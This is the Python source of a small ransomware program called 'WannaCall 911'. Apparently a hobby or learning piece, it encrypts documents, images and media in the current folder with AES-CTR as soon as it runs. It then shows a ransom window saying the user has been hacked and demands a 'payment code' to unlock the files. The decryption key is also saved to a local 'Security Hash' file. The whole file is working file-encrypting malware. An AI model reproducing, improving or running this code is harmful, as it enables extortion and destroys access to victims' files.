# Imports
#   Core
import os
import random
import hashlib
import socket
#   Encription
from Crypto.Util import Counter
from Crypto.Cipher import AES
#   UI
from tkinter import ttk, Tk

# Data
#   Files
encription_folder = os.path.abspath('')
file_extensions = [".txt", ".jpg", '.jpeg', '.mp4', '.mp3', '.png', '.pdf', '.docx', '.jfif']
files = [file for file in os.listdir(encription_folder) for ext in file_extensions if ext in file ]

# Handlers
#   Generates hash code
def gen_hash():
    # Define hash data
    hash = encription_folder + socket.gethostname() + str(random.randint(0,1000000))
    # Encode UTF-8
    hash = hash.encode('utf-8')
    # Gen Hash
    hash = hashlib.sha512(hash)
    # String hexidecimal
    hash = hash.hexdigest()
    # Slice 32 digits
    hash = hash[:32]

    # Return
    return hash

#   Encryption / Decryption Algorithm
def crypto_algorithm(key, method):
    # Encodes key
    key = key.encode('utf-8')
    # Creates counter
    counter = Counter.new(128) 
    # Define encryption algorithm
    encrypt = AES.new(key, AES.MODE_CTR, counter = counter).encrypt
    # Define decryption algorithm
    decrypt = AES.new(key, AES.MODE_CTR, counter = counter).decrypt
    # Dictionary
    algorithm = {"Encrypt": encrypt, "Decrypt": decrypt}
    # Validation
    if not method in algorithm: raise ValueError("'Encrypt' and 'Decrypt'")

    return algorithm[method]

#   Encrypts / Decrypts specified files
def encrypt_file(key, file_name, algorithm, block_size = 16):
    # Opens file
    with open(file_name, 'r+b') as file:
        # Reads file content
        file_content = file.read(block_size)
        while file_content:
            # Encrypt content
            encrypted_content = algorithm(file_content)
            # Find data location
            file.seek(- len(file_content), 1)
            # Rewrite data
            file.write(encrypted_content)
            # Assign new block of content
            file_content = file.read(block_size)

#   Deletes and reset the environment
def reset_environment():
	if os.path.exists("Affected Files"):
		os.remove("Affected Files")

	if os.path.exists("Security Hash"):
		os.remove("Security Hash")

#   Encrytps specified files
def encrypt_files(key, files):
    for file in files:
        encrypt_file(key, file, crypto_algorithm(key, "Encrypt"))

#   Decrytps specified files
def decrypt_files(key, files):
    for file in files:
        encrypt_file(key, file, crypto_algorithm(key, "Decrypt"))
    
    reset_environment()

#   Get hash key
def get_hash_key():
    # Gen or get hash key
    hash_key = None
    if os.path.exists('Security Hash'):
        # Get hash key from file
        with open('Security Hash', "r") as hash_file:
            hash_key = hash_file.read().split(' ')[2]
            print(f'file {hash_key}')
    else: 
        # Gen hash key from algorithm
        hash_key = gen_hash()
        print(f'gen {hash_key}')
    
    return hash_key

#   Main - encryption / decryption functionality
def wanna_call_911():
    # Get hash key
    hash_key = get_hash_key()

    # Creates / Rewrites 'Affected Files.txt', with the endangered files
    with open("Affected Files", "w+") as affected_files:
        affected_files.write("Affected Files: \n")
        for file in files:
            affected_files.write(f'- {file} \n')

    # Check for existing traces from previous encryptions
    if not os.path.exists('Security Hash'):
        # Encrypt Files
        encrypt_files(hash_key, files)

        # Creates / Rewrites 'Security Hash.txt', with the decryption hash key
        with open("Security Hash", "w+") as security_hash:
            security_hash.write(f"Hash Key: {hash_key}")

# UI
#   Data
messages = {
    "title": "WannaCall 911",
    "label": "Payment Code:",
    "payment": "You have been hacked by the Wanna Call 911 :)",
    "information": "Your files have been encrypted, please provide the payment code to unlock them!"
}
#   Structure
root = Tk(screenName=messages['title'])
root.geometry("500x200")

#   Elements
warning_text = ttk.Label(text=messages['payment'])
information_text = ttk.Label(text=messages['information'])
entry_label = ttk.Label(text=messages['label'])
#       Inputs
entry = ttk.Entry()
#       Handlers
def submit_payment():
    payment = entry.get()
    hash = get_hash_key()

    if(payment == hash):    
        decrypt_files(hash, files)
        root.destroy()
#   Elements
submit = ttk.Button(text="Submit", command=submit_payment)
#   Pack Elements
warning_text.pack(expand=True)
information_text.pack(expand=True)
entry_label.pack()
entry.pack()
submit.pack(expand=True)

# Runnable
#   Experimental Mode
# reset_environment()
wanna_call_911()
root.mainloop()